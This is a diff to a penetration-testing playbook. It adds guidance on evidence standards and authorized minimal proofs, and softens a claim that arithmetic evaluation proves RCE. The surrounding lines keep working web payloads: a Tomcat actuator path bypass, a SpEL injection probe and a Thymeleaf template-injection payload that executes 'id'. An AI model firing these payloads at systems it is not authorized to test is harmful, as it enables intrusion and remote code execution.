@@ -9,6 +9,15 @@ Framework-specific attacks, mobile testing, CI/CD pipelines, and deep-dive techn
 
 ---
 
+## Prerequisites and evidence
+
+Load `real-world-validation` first. The examples below are investigation leads,
+not assertions that a framework or endpoint is vulnerable. Establish component,
+version, configuration and the relevant trust boundary. Use owned disposable
+fixtures for writes, avoid bulk sensitive downloads, and replace impactful
+examples with the smallest authorized proof. Do not infer RCE from an error,
+an arithmetic result, an exposed health check or a product fingerprint.
+
 ## 1. FRAMEWORK-SPECIFIC ATTACK PLAYBOOKS
 
 ### Next.js
@@ -72,7 +81,8 @@ curl -s https://target.com/actuator/..;/env  # Tomcat path normalization bypass
 
 # SpEL injection in error messages
 curl "https://target.com/api/search?q=\${7*7}"
-# If response contains "49" → SpEL injection → RCE
+# Compare controlled expression results against literal and negative controls;
+# arithmetic evaluation alone does not establish RCE
 
 # Thymeleaf SSTI
 curl "https://target.com/path?lang=__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
